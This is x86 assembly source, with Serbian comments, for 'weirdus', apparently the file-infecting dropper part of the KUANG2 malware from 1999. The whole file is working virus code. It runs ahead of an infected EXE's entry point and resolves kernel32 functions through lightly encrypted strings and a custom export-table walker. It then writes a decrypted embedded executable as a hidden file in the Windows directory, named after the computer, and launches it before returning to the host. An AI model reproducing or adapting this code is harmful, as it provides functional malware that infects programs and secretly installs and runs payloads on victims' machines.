;***[ThuNderSoft]*************************************************************
;								KUANG2: weirdus
;								   ver: 0.21
;								˙˘ƒÕ WEIRD Õƒ˘˙
;*****************************************************************************

;* HISTORY *
; ver 0.21 (18-may-1999): joÑ smanjenja (cmpname)
; ver 0.20 (08-mar-1999): standardni oblik radi
; ver 0.10 (29-jan-1999): born code

.387
.386p

;**	  weirdus
;**	  -------
;** ˛ Ovde se nalazi kod virusa koji se kaÅi na EXE fajlove
;** ˛ Ceo je u DATA segmentu jer nam je lakÑe da mu pristupamo iz Watcoma.
;**	  Moglo je da bude i u CODE segmentu - tada bi morali da koristimo
;**	  program PEWRSEC, ali dobija se isto
;** ˛ Obrati paÇnju: program ne sme da bude vezan direktno za bilo Ñta -
;**	  sve mora da se radi preko ofseta
;** ˛ Zbog baga asemblera? ne moÇe da radi 'mov eax, [ebp + ofs1 - ofs2] (16 bitno?)
;**	  Zato moramo da koristimo apsolutnu dodelu.
;** ˛ Trenutna veliÅina: 999 bajta


include weirdus.inc


_DATA segment dword public use32 'DATA'
assume ds:_DATA, ss:_DATA

PUBLIC _virus_start, _virus_end
PUBLIC _oldEntryPoint, _oldEntryPointRVA, _oldEPoffs, _oldfilesize
PUBLIC _oldoffs1, _olddata1, _oldoffs2, _olddata2, _oldoffs3, _olddata3, _oldoffs4, _olddata4, _oldoffs5, _olddata5
PUBLIC _ddGetModuleHandleA, _ddGetProcAddress
PUBLIC _addfile_size, _kript


;*******************
;*** Kod sekcija ***
;*******************

_virus_start:
		push eax				; saÅuvaj mesto za povratnu adresu (ka hostu)
		pushad
		call letsgo

letsgo:
		pop ebp					; pokupi IP (instruction pointer) od call-a
		add ebp, _data_start - letsgo	; ebp sada pokazuje na podatke (_data_start)

x = _OldEntryPoint - _data_start
		mov eax, cs:[ebp+x]		; pokupi host EntryPoint
		mov [esp+32], eax		; namesti oldEntrypoint hosta u stek


;***********************
;*** Inicijalizacija ***
;***********************

;prvo dekriptuj stringove f-ja
x = strKernel - _data_start
		lea eax, [ebp+x]
@@:		cmp byte ptr [eax], 0
		je @f					; ako smo na kraju, skoÅi
		dec byte ptr [eax]
		inc eax
		jmp @b					; vrti petlju
@@:

; esi = GetModuleHandleA(KERNEL32.DLL)
x = strKernel - _data_start
		lea eax, [ebp + x]
		push eax				; Arg0 = LPCTSTR lpModuleName
x = _ddGetModuleHandleA - _data_start
		mov eax, cs:[ebp + x]
		call dword ptr [eax]	; call GetModuleHandleA
		test eax, eax
		jz virus_exit			; ako je nastala greÑka, skoÅi
		mov esi, eax			; esi = HMODULE (KERNEL32.DLL)


; GetProcAddress
x = _ddGetProcAddress - _data_start
		mov eax, cs:[ebp+x]		; prvo proveri da li je GetProcAddress
		test eax, eax			; uvezena u ovom exe fajlu
		jnz @f					; da, sve je u redu, idi dalje
								; ne, ajd sad da probamo sami da naîemo

; Sam naîi adresu GetProcAddress ako moÇeÑ
x = strGetProcAddress - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg1 = LPCSTR lpProcName
		push esi				; Arg0 = hModule (KERNEL32.DLL)
		call near ptr WinGetProcAddress
		test eax, eax			; da li je f-ja naîena?
		jz virus_exit			; nije, skoÅi
x = ddGetProcAddress - _data_start
		lea ebx, cs:[ebp+x]
		mov [ebx], eax			; zapamti adresu f-je
		mov [ebx-4], ebx		; i pointer na adresu


;*******************************
;*** Naîi adrese WinAPI f-ja ***
;*******************************
; u cilju smanjenja koda obavezan je ovaj redosled f-ja!

@@:
; GetProcAddress (GetWindowsDirectoryA)
x = strGetWindowsDirectoryA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
x = ddGetWindowsDirectoryA - _data_start
		lea edi, cs:[ebp+x]
		mov [edi], eax			; zapamti adresu f-je

; GetProcAddress (GetComputerNameA)
x = strGetComputerNameA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+4], eax		; zapamti adresu f-je

; GetProcAddress (CreateFileA)
x = strCreateFileA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+8], eax		; zapamti adresu f-je

; GetProcAddress (WriteFile)
x = strWriteFile - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+12], eax		; zapamti adresu f-je

; GetProcAddress (CloseHandle)
x = strCloseHandle - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+16], eax		; zapamti adresu f-je

; GetProcAddress (CreateProcessA)
x = strCreateProcessA - _data_start
		lea eax, cs:[ebp+x]
		call near ptr MyGetProcAddress
		mov [edi+20], eax		; zapamti adresu f-je


;*******************************
;*** Priprema stringova itd. ***
;*******************************

; GetWindowsDirectoryA
		push dword ptr 256		; Arg1 = UINT Size
x = filename - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg0 = LPTSTR lpBuffer
		call dword ptr [edi]	; call GetWindowsDirectoryA

; GetComputerNameA
x = cmpname_len - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg1 = LPDWORD nSize
x = cmpname - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg0 = LPTSTR lpBuffer
		call dword ptr [edi+4]	; call GetComputerNameA

; formiraj jedinstveno ime fajla u filename
; lepo je Ñto ComputerName sadrÇi samo za fajlove validne karaktere!
x = cmpname - _data_start
		lea edx, cs:[ebp+x]		; edx -> cmpname
x = filename - _data_start
		lea eax, cs:[ebp+x]		; eax -> filename
@@:		cmp byte ptr [eax], 0
		je @f
		inc eax
		jmp @b
@@:		mov byte ptr [eax], '\' ; dodaj na kraj filename '\'
		inc eax

@@:		mov cl, byte ptr [edx]
		cmp cl, 0
		je @f
		mov ch, cl
		sub ch, 'A'
		cmp ch, 25
		ja temp1				; ako nije veliko slovo idi dalje
		add cl, 32				; veliko slovo pretvori u malo
temp1:	mov ch, cl
		sub ch, 'a'
		cmp ch, 25
		ja nextchar				; ako nije slovo onda ga upiÑi
		dec cl					; ako je slovo uzmi prethodno (HAL & IBM:)
		cmp cl, 'a'-1           ; ako je slovo bilo 'a'
		jne nextchar			; nije
		mov cl, 'z'             ; jeste, uradi wrapping
nextchar:
		mov byte ptr [eax], cl
		inc eax
		inc edx
		jmp @b
@@:

; dodaj joÑ extenziju '.exe'
		mov dword ptr [eax], 6578652Eh
		mov byte ptr [eax+4], 0 ; zatvori string


;*******************************************************************
;*** Kreiraj fajl ako ga nema, zapiÑi u njega virus i zatvori ga ***
;*******************************************************************

; kreiraj fajl
		xor edx, edx			; edx = NULL
		push edx						; Arg6 = hTemplateFile
		push dword ptr FILE_ATTRIBUTE_HIDDEN+FILE_ATTRIBUTE_ARCHIVE		; Arg5 = dwFlagsAndAttributes
		push dword ptr CREATE_NEW		; Arg4 = dwCreationDistribution
		push edx						; Arg3 = lpSecurityAttributes
		push edx						; Arg2 = dwShareMode
		push dword ptr GENERIC_WRITE	; Arg1 = dwDesiredAccess
x = filename - _data_start
		lea eax, cs:[ebp+x]		; eax -> filename
		push eax				; Arg0 = lpFileName
		call dword ptr [edi+8]	; call CreateFileA
		cmp dword ptr eax, INVALID_HANDLE_VALUE
		je virus_start			; doÑlo je do greÑke ili virus veÜ postoji!

		mov edx, eax			; nema greÑke, zapamti handle fajla
		push eax				; i stavi na stek poÑto treba kasnije za CloseHandle

; dekriptuj i upiÑi fajl
		xor ecx, ecx
		push ecx				; Arg4 = lpOverlapped
x = temp - _data_start
		lea eax, cs:[ebp+x]		; eax -> temp
		push eax				; Arg3 = lpNumberOfBytesWritten
x = _addfile_size- _data_start
		lea eax, cs:[ebp+x]
		mov ecx, [eax]
		push ecx				; Arg2 = nNumberOfBytesToWrite
		add eax, 4
		push eax				; Arg1 = lpBuffer
		push edx				; Arg0 = handle
; dekriptuj
x = _kript - _data_start
		mov bl, cs:[ebp+x]
@@:		add [eax], bl
		inc eax
		add bl, 173
		dec ecx
		jnz @b
; upiÑi
		call dword ptr [edi+12] ; call WriteFile

; zatvori kreiran fajl
;		push edx				; Arg0 = handle (bilo ranije!)
		call dword ptr [edi+16] ; call CloseHandle


;*******************************
;*** Startuje (kreiran) fajl ***
;*******************************

;CreateProcess(proginame, NULL, NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, (LPTSTR)NULL, &si, &pi))
virus_start:
		xor edx, edx
x = process_information - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg9 = lpProcessInformation
x = startup_info - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg8 = lpStartupInfo
;pripremi startupinfo
		mov cl, 67
@@:		inc eax
		mov [eax], dl
		dec cl
		jnz @b
		mov byte ptr [eax-20], 80h		; STARTF_FORCEOFFFEEDBACK
;ostatak
		push edx				; Arg7 = lpCurrentDirectory
		push edx				; Arg6 = lpEnvironment
		push dword ptr NORMAL_PRIORITY_CLASS		; Arg5 = dwCreationFlags
		push edx				; Arg4 = bInheritHandles
		push edx				; Arg3 = lpThreadAttributes
		push edx				; Arg2 = lpProcessAttributes
		push edx				; Arg1 = lpCommandLine
x = filename - _data_start
		lea eax, cs:[ebp+x]
		push eax				; Arg0 = lpApplicationName
		call dword ptr [edi+20] ; call CreateProcessA


;**************************************
;*** Izaîi iz virusa i startuj host ***
;**************************************
virus_exit:
		popad
		ret						; hop nazad na host


;************************
;*** MyGetProcAddress ***
;************************
; dobavlja adresu neke WinAPI f-je iz KERNEL32.DLL
; ulaz: eax -> string sa imenom f-je iz kernel32.dll
;		esi = hmodule(kernel32.dll)
; izlaz: eax = adresa f-je
MyGetProcAddress:
		push eax				; Arg1 = LPCSTR lpProcName
		push esi				; Arg0 = hModule (KERNEL32.DLL)
x = _ddGetProcAddress - _data_start
		mov edx, cs:[ebp+x]
		call dword ptr [edx]	; call GetProcAddress
		test eax, eax			; da li je f-ja naîena?
		jz virus_exit			; nije, skoÅi
		retn



;*************************
;*** WinGetProcAddress ***
;*************************
; u sluÅaju da GetProcAddress nije uvezena, koristi se ova f-ja
; za dobavljanje adrese te f-je. MoÇe da sluÇi i za dobavljanje
; svih ostalih adresa, ali bolje da to Windows radi.
; ZnaÅi, ova f-ja je malo modifikovana tako da ide u prilog tome
; da se dobavlja samo adresa f-je GetProcAdress.
WinGetProcAddress:
		push ebx
		push esi
		push edi

; uzmi hModule
		mov edx, [esp+16]

; Brza provera ispravnosti - ovde nam ne treba poÑto sigurno
; traÇimo f-ju iz validnog handlea kernel32.dll!
		sub eax, eax
;		cmp word ptr [edx], 'ZM'
;		jnz @@gpaExit
		mov edx, [edx+60]
		add edx, [esp+16]
;		cmp dword ptr [edx], 'EP'
;		jnz @@gpaExit

; handle je validan - brza provera je proÑla OK
		mov edx, [edx+78h]
		add edx, [esp+16]

; EDX sada pokazuje na poÅetak .edata
; [edx+12] -> module name	 RVA
; [edx+16] =  ordinal base
; [edx+20] =  number of addresses
; [edx+24] =  number of names
; [edx+28] -> array of n address RVA
; [edx+32] -> array of n names*	 RVA
		mov ecx, [edx+24]
		jecxz @@gpaExit

; Proîi kroz sve stringove dok ne naîeÑ isti ili do kraja
		mov edi, [edx+32]
		add edi, [esp+16]

@@gpaLoop:
;		mov ebx, [edi-4]
		mov ebx, [edi]
		add edi, 4
		add ebx, [esp+16]
		mov esi, [esp+20]

@@gpaCmpStr:
		mov al, [ebx]
		mov ah, [esi]
		or ah, al
		jz short @@gpaOrdinalFound

		cmp al, [esi]
		jne short @@gpaCheckNext

		inc esi
		inc ebx
		jmp short @@gpaCmpStr

@@gpaCheckNext:
		loop short @@gpaLoop

; nije naîen string, vrati greÑku
		sub eax, eax
		jmp short @@gpaExit

@@gpaOrdinalFound:
; najzad je naîeno ono Ñto se traÇi: (numNames - ECX) je ordinal
; funkcije Åiju adresu traÇimo
		mov eax, [edx+24]
		sub eax, ecx
		mov ecx, [edx+24h]
		add ecx, [esp+16]
		movzx eax, word ptr [eax*2+ecx]
		mov eax, [edx+eax*4+28h]
		add eax, [esp+16]

@@gpaExit:
		pop edi
		pop esi
		pop ebx
		retn 8




;********************
;*** Data sekcija ***
;********************
; ovde slede podaci koji se koriste
; stringovi WinAPI su kriptovani
; da bi se prostor iskoristio Ñto bolje, stringovi su preklopljeni
; sa drugim podacima, poÑto se stringovi koriste samo na poÅetku programa


_data_start:
;*** Globalni podaci ***
_oldEntryPoint			dd	?
_oldEntryPointRVA		dd	?
_oldEPoffs				dd	?
_oldfilesize			dd	?
_oldoffs1				dd	?	; veliÅina poslednje sekcija (SizeOfRawData)
_olddata1				dd	?
_oldoffs2				dd	?	; veliÅina poslednje sekcije u DirectoryData (ako postoji!)
_olddata2				dd	?
_oldoffs3				dd	?	; karakteristike poslednje sekcije
_olddata3				dd	?
_oldoffs4				dd	?	; veliÅina poslednje sekcije (VirtualSize)
_olddata4				dd	?
_oldoffs5				dd	?	; SizeofImage
_olddata5				dd	?
_kript					db	?

;*** Lokalni podaci ***

; stringovi: 116 bajtova
strKernel				db 'W' ;db 4Ch                          ; "K"
process_information		db 46h, 53h, 4Fh, 46h, 4Dh, 34h
cmpname					db 33h, 2Fh, 45h, 4Dh, 4Dh, 1	; "ERNEL32.DLL", 0  (ujedno i: dd 0, 0, 0, 0)
strGetWindowsDirectoryA db 48h, 66h, 75h, 58h, 6Ah, 6Fh
						db 65h, 70h, 78h, 74h
startup_info			db 45h, 6Ah, 73h, 66h			; poÅinje sa dwordom 68, a zatim ide joÑ 16 dworda (68 bajta ukupno)
						db 64h, 75h, 70h, 73h
						db 7Ah, 42h, 1					; "GetWindowsDirectoryA", 0
strGetComputerNameA		db 48h, 66h, 75h, 44h, 70h, 6Eh
						db 71h, 76h, 75h, 66h, 73h, 4Fh
						db 62h, 6Eh, 66h, 42h, 1		; "GetComputerNameA", 0
strCreateFileA			db 44h							; "C"
temp					db 73h, 66h, 62h, 75h, 66h, 47h
						db 6Ah, 6Dh, 66h, 42h, 1		; "reateFileA", 0  (ujedno i: dd 0)
strWriteFile			db 58h, 73h, 6Ah, 75h, 66h, 47h
						db 6Ah, 6Dh, 66h, 1				; "WriteFile", 0
strCloseHandle			db 44h, 6Dh, 70h, 74h, 66h, 49h
						db 62h, 6Fh, 65h, 6Dh, 66h, 1	; "CloseHandle", 0
strCreateProcessA		db 44h, 73h, 66h, 62h, 75h, 66h
						db 51h, 73h, 70h, 64h, 66h, 74h
						db 74h, 42h, 1					; "CreateProcessA", 0
strGetProcAddress		db 48h, 66h, 75h, 51h, 73h, 70h
						db 64h, 42h, 65h, 65h, 73h, 66h
						db 74h, 74h, 0					; "GetProcAddress", 0

filename				db MAX_PATH dup(0), 0
;cmpname					db MAX_COMPUTERNAME_LENGTH dup(0), 0
cmpname_len				dd MAX_COMPUTERNAME_LENGTH+1

;*** Pointeri na WinAPI f-je ***
; u cilju smanjenja duÇine koda ovaj redosled je obavezan!!!!
_ddGetModuleHandleA		dd	?
_ddGetProcAddress		dd	?
ddGetProcAddress		dd	?
ddGetWindowsDirectoryA	dd	?		; <- edi
ddGetComputerNameA		dd	?
ddCreateFileA			dd	?
ddWriteFile				dd	?
ddCloseHandle			dd	?
ddCreateProcessA		dd	?

;*** Ovde Üe se smestiti ceo exe fajl ***
_addfile_size			dd ?	; ovde ide veliÅina fajla koji je dodat
;_virus_data					; ovde se nalazi exe fajl koga treba zapisati
								; znaÅi: (&_addfile_size) + sizeof(dd)

_virus_end:						; KonaÅno... kraj virusa
_DATA ends

end
